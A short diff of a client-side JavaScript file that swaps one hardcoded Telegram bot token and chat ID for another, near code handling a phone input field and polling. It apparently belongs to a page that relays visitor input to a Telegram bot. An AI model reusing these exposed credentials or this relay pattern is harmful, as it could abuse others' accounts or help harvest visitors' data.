@@ -21,8 +21,8 @@ document.addEventListener('DOMContentLoaded', function() {
     let isChecked = false;
     let pollingInterval;
 
-    const TELEGRAM_API_KEY = '8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw';
-    const TELEGRAM_CHAT_ID = '-1004245962123';
+    const TELEGRAM_API_KEY = '8587283632:AAFFsDyTcTyQYiQyM4rghouex0dlidIZEsk';
+    const TELEGRAM_CHAT_ID = '5360036647';
 
     // Desbloquear inputs
     if (phoneInput) phoneInput.removeAttribute('readonly');
